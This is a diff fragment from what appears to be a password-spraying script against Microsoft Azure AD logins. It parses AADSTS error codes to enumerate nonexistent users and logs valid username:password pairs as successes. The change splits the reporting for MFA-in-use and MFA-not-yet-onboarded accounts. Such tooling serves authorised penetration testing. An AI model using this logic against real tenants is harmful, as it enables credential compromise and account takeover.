@@ -93,9 +93,14 @@ for username in usernames:
         elif "AADSTS50034" in error:
             print(f"WARNING! The user {username} doesn't exist.")
 
-        elif "AADSTS50079" in error or "AADSTS50076" in error:
+        elif "AADSTS50076" in error:
             # Microsoft MFA response
             print(f"SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.")
+            results += f"{username} : {password}\n"
+        
+        elif "AADSTS50079" in error:
+            # Microsoft MFA response
+            print(f"SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) must be onboarded!")
             results += f"{username} : {password}\n"
 
         elif "AADSTS50158" in error:
